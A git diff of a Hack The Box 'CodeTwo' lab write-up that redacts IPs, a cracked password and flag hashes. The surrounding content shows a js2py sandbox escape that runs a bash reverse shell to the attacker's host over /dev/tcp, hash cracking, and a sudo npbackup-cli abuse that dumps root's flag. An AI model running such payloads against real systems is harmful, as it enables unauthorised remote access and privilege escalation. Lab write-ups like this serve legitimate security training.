@@ -1,5 +1,6 @@
 ---
 title: CodeTwo [Easy]
+published: false
 date: 2025-08-17
 tags: [htb, linux, nmap, db, flask, js2py, cve-2024-28397, npbackup, sandbox-escape, crack]
 categories: [HTB Writeups]
@@ -15,9 +16,9 @@ Author: [FisMatHack](https://app.hackthebox.com/users/1076236)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.58.119
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 09:16 EDT
-Nmap scan report for 10.129.58.119
+Nmap scan report for 10.129.xx.xx
 Host is up (0.47s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
@@ -37,7 +38,7 @@ Nmap done: 1 IP address (1 host up) scanned in 51.80 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.58.119     codetwo.htb
+10.129.xx.xx     codetwo.htb
 ```
 
 Here we have port 8000, let's check it out.
@@ -262,7 +263,7 @@ First we will setup listerner to catch the reverse shell.
 
 ```bash
 └─$ penelope -p 3333      
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
@@ -289,7 +290,7 @@ function findPopen(o) {
 
 var Popen = findPopen(obj);
 if (Popen) {
-    var cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.36/3333 0>&1'";
+    var cmd = "bash -c 'bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1'";
     Popen(cmd, -1, null, -1, -1, -1, null, null, true);
 }
 ```
@@ -302,13 +303,13 @@ Click and *Run Code* button.
 
 ```bash
 └─$ penelope -p 3333      
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from codetwo~10.129.58.119-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from codetwo~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/codetwo~10.129.58.119-Linux-x86_64/2025_08_17-09_52_15-632.log 📜
+[+] Logging to /home/kali/.penelope/codetwo~10.129.xx.xx-Linux-x86_64/2025_08_17-09_52_15-632.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 app@codetwo:~/app$ pwd
 /home/app/app
@@ -355,7 +356,7 @@ There are some hash, let's crack it. <br>
 ![CodeTwo CrackStation](/assets/img/codetwo-htb-release-area-machine/codetwo-htb-release-area-machine_crackstation.png)
 
 BOOM! We got password for `marco` user.
-&rarr; `marco:sweetangelbabylove`.
+&rarr; `marco:sweetangelbabyxxxx`.
 
 
 We can either switch to `marco` in the `app` session or just ssh directly.
@@ -381,12 +382,12 @@ lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
 drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
 -rw-r----- 1 root  marco   33 Aug 17 13:15 user.txt
 marco@codetwo:~$ cat user.txt
-2088bb4c1b24cc791705fb6c04dfef16
+2088bbxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 ```bash
-└─$ ssh marco@10.129.58.119 
-marco@10.129.58.119's password: 
+└─$ ssh marco@10.129.xx.xx 
+marco@10.129.xx.xx's password: 
 marco@codetwo:~$ ls -la
 total 44
 drwxr-x--- 6 marco marco 4096 Aug 17 14:00 .
@@ -677,7 +678,7 @@ Now we just need to dump the file we want.
 
 ```bash
 marco@codetwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c malicious.conf --dump /root/root.txt
-ec295dc17c45034def14dde32d1dcdd6
+ec295dxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 There we go, we got the `root.txt` flag.
